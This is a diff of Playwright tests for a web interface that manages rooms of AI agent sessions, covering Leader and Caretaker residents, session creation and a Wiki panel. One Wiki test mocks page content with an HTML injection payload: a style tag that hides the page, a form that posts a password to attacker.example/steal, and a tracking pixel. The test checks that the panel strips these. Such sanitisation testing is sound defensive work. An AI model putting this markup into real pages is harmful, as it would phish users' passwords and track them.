@@ -60,59 +60,125 @@ test('attaches and detaches an existing chat without duplicate Room rows', async
   await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(1)
 })
 
-test('Room card opens its main human chat instead of the Keep-working pulse', async ({ page }) => {
+test('Room card always opens its durable Leader chat and lists residents separately', async ({ page }) => {
   await page.setViewportSize({ width: 390, height: 844 })
-  const pulse = {
-    id: 'pulse-chat', title: 'Keep working: #feather', updatedAt: '2026-08-24T01:00:00Z',
+  const leader = {
+    id: 'leader-human-chat', title: '#feather Leader', updatedAt: '2026-08-23T23:00:00Z',
+    isActive: false, agent: 'omp', roomAssigned: true,
+  }
+  const caretaker = {
+    id: 'caretaker-chat', title: '#feather Caretaker', updatedAt: '2026-08-23T22:00:00Z',
     isActive: true, agent: 'omp', roomAssigned: true,
   }
-  const main = {
-    id: 'main-human-chat', title: '#feather main', updatedAt: '2026-08-23T23:00:00Z',
-    isActive: false, agent: 'omp', roomAssigned: true,
+  const other = {
+    id: 'other-chat', title: 'One-off investigation', updatedAt: '2026-08-23T21:00:00Z',
+    isActive: false, agent: 'claude', roomAssigned: true,
   }
   await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
     name: 'feather', cwd: '/home/user/rooms/feather', active: true,
-    latest: { role: 'assistant', text: 'Pulse finished work.' }, updatedAt: pulse.updatedAt,
+    latest: { role: 'assistant', text: 'Leader finished work.' }, updatedAt: leader.updatedAt,
     updates: { count: 0, latestAt: null, latest: null },
     friction: { count: 0, latestAt: null, latest: null },
-    pulse: { enabled: true, status: 'working', lastRunAt: pulse.updatedAt, nextRunAt: null, sessionId: pulse.id },
-    sessions: [pulse, main],
+    pulse: { enabled: true, status: 'waiting', lastRunAt: null, nextRunAt: null, sessionId: null },
+    leaderSessionId: leader.id,
+    residents: [
+      { role: 'leader', sessionId: leader.id, agent: 'omp', title: leader.title, status: 'waiting' },
+      { role: 'caretaker', sessionId: caretaker.id, agent: 'omp', title: caretaker.title, status: 'working' },
+    ],
+    sidecarGroupId: 'room-feather',
+    sessions: [leader, caretaker, other],
   }] } }))
 
   await page.goto(BASE)
-  await expect(page.getByText('#feather', { exact: true })).toBeVisible()
-  await page.locator('button:has-text("›")').click()
-  await expect(page.getByText('Main', { exact: true })).toBeVisible()
+  await expect(page.getByTestId('room-card-feather')).toContainText('2 residents')
+  await page.getByTestId('room-card-feather').locator('button:has-text("›")').click()
+  await expect(page.getByTestId('resident-feather-leader')).toBeVisible()
+  await expect(page.getByTestId('resident-feather-caretaker')).toBeVisible()
+  await expect(page.getByText('One-off investigation', { exact: true })).toBeVisible()
+  await expect(page.getByText('#feather Leader', { exact: true })).toHaveCount(0)
   await page.getByText('#feather', { exact: true }).click()
-  await expect(page).toHaveURL(/#main-human-chat$/)
+  await expect(page).toHaveURL(/#leader-human-chat$/)
 })
 
-test('shows room updates newest-first and remembers that they were read', async ({ page }) => {
-  const room = {
-    name: 'briefings', cwd: '/srv/zak/home/rooms/briefings', active: false,
-    latest: null, updatedAt: '2026-08-22T12:00:00Z', sessions: [],
+test('opening a Room without a Leader creates its OMP Leader atomically', async ({ page }) => {
+  let sessionBody = null
+  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
+    name: 'new-room', cwd: '/srv/rooms/new-room', active: false, latest: null, updatedAt: null,
+    leaderSessionId: null, residents: [], sidecarGroupId: null, sessions: [],
+    updates: { count: 0, latestAt: null, latest: null },
+    friction: { count: 0, latestAt: null, latest: null },
     pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
-    updates: { count: 2, latestAt: '2026-08-22T12:00:00Z', latest: 'Second outcome.' },
-  }
-  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [room] } }))
-  await page.route('**/api/rooms/briefings/updates', route => route.fulfill({ json: { updates: [
-    { id: 'first', ts: '2026-08-22T11:00:00Z', text: 'First outcome.' },
-    { id: 'second', ts: '2026-08-22T12:00:00Z', text: 'Second outcome.' },
-  ] } }))
-  await page.goto(BASE)
-  const button = page.getByTestId('updates-briefings')
-  await expect(button).toContainText('2 new')
-  await button.click()
-  const panel = page.getByTestId('updates-panel-briefings')
-  await expect(panel).toBeVisible()
-  await expect(panel.locator('div').filter({ hasText: 'Second outcome.' }).last()).toBeVisible()
-  const entries = panel.getByTestId('room-update')
-  await expect(entries.first()).toContainText('Second outcome.')
-  await expect(button).not.toContainText('new')
-  await expect.poll(() => page.evaluate(() => JSON.parse(localStorage.getItem('feather:roomUpdatesSeen') || '{}').briefings)).toBe(2)
+  }] } }))
+  await page.route('**/api/sessions', async route => {
+    if (route.request().method() !== 'POST') return route.continue()
+    sessionBody = JSON.parse(route.request().postData() || '{}')
+    await route.fulfill({ json: { id: sessionBody.id, status: 'starting', agent: 'omp', roomRole: 'leader' } })
+  })
 
-  await page.reload({ waitUntil: 'domcontentloaded' })
-  await expect(page.getByTestId('updates-briefings')).not.toContainText('new')
+  await page.goto(BASE)
+  await page.getByText('#new-room', { exact: true }).click()
+  await expect.poll(() => sessionBody).toMatchObject({
+    agent: 'omp',
+    roomName: 'new-room',
+    roomRole: 'leader',
+  })
+})
+
+test('Wiki presents caretaker synthesis and never exposes raw Updates or active content', async ({ page }) => {
+  let updateRequests = 0
+  let remoteMediaRequests = 0
+  await page.route('https://attacker.example/**', async route => {
+    remoteMediaRequests++
+    await route.abort()
+  })
+  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
+    name: 'briefings', cwd: '/srv/rooms/briefings', active: false,
+    latest: null, updatedAt: '2026-08-22T12:00:00Z', sessions: [],
+    leaderSessionId: null, residents: [], sidecarGroupId: null,
+    friction: { count: 0, latestAt: null, latest: null },
+    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
+    updates: { count: 2, latestAt: '2026-08-22T12:00:00Z', latest: 'RAW COPIED TWEET' },
+  }] } }))
+  await page.route('**/api/rooms/briefings/wiki', route => route.fulfill({ json: {
+    pages: [{ name: 'Home', size: 80, updatedAt: '2026-08-22T14:00:00Z' }],
+  } }))
+  await page.route('**/api/rooms/briefings/wiki/page**', route => route.fulfill({ json: {
+    name: 'Home',
+    content: '# Briefing knowledge\n\nThe caretaker synthesized durable evidence.\n\n<style>body{display:none}</style><form action="https://attacker.example/steal"><input name="password"></form>![pixel](https://attacker.example/pixel)',
+    updatedAt: '2026-08-22T14:00:00Z',
+  } }))
+  await page.route('**/api/rooms/briefings/updates', route => {
+    updateRequests++
+    return route.fulfill({ json: { updates: [{ id: 'raw', ts: null, text: 'RAW COPIED TWEET' }] } })
+  })
+
+  await page.goto(BASE)
+  await page.getByTestId('wiki-briefings').click()
+  const panel = page.getByTestId('wiki-panel-briefings')
+  await expect(panel).toContainText('The caretaker synthesized durable evidence')
+  await expect(panel).not.toContainText('RAW COPIED TWEET')
+  await expect(panel.locator('style, form, input, img')).toHaveCount(0)
+  await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
+  expect(updateRequests).toBe(0)
+  expect(remoteMediaRequests).toBe(0)
+})
+
+test('passes the chosen model only when launching a new OMP session', async ({ page }) => {
+  let sessionBody = null
+  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [] } }))
+  await page.route('**/api/sessions', async route => {
+    if (route.request().method() !== 'POST') return route.continue()
+    sessionBody = JSON.parse(route.request().postData() || '{}')
+    await route.fulfill({ json: { id: sessionBody.id, status: 'starting', agent: sessionBody.agent } })
+  })
+
+  await page.goto(BASE)
+  await page.getByTestId('omp-model-override').fill('anthropic/claude-opus-5')
+  await page.getByRole('button', { name: '+ OMP', exact: true }).click()
+  await expect.poll(() => sessionBody).toMatchObject({
+    agent: 'omp',
+    model: 'anthropic/claude-opus-5',
+  })
 })
 
 test('shows friction only on the Room that reported it', async ({ page }) => {
